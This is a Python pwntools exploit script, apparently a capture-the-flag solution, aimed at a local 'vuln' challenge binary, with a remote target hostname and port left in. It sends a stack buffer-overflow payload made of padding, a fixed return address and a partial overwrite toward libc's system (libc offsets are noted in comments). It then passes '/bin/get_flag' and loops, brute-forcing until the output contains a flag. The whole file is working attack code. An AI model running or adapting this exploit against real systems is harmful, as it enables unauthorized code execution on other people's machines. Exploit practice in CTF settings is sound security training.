#!/usr/bin/python3

from pwn import *

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky2"
    port = 13708


i = 0

while True:
    proc=process('../materials/vuln')
    #proc=remote(host,port)
    proc.write(35*p64(0x00) + p64(0x401483) + 2*p64(0x00) + b"\x30\xc3\x04") #Offset System in 2.31: 0x45e50    #Offset local: 0x4c330
    proc.write("/bin/get_flag\x00")
    #res = proc.read(timeout=1).decode()

    res=b""
    for j in range(0,6):
        try:
            res2 = proc.readline(timeout=0.2)
            res += res2
            print(res2)
        except Exception as err:
            print(Exception, err)
            print("AAA")
            break

    print(res.decode())
    if b'flag' in res:
        print(res.decode())
        break
    print(hex(i))
    i = i + 1
    proc.kill()
    proc.close()



